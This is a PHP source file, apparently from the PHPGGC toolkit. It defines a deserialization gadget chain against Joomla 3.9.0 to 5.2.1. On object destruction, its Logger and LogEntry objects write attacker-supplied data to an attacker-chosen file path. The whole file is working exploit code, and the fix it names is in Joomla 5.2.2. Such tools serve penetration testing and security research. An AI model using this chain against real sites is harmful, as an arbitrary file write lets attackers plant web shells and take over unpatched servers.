<?php

namespace GadgetChain\Joomla;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '3.9.0 <= 5.2.1';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'Fixed in https://github.com/joomla/joomla-cms/pull/44428
    which is included in the 5.2.2 release.';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \Joomla\CMS\Log\Logger\FormattedtextLogger(
            $path,
            new \Joomla\CMS\Log\LogEntry($data)
        );
    }
}
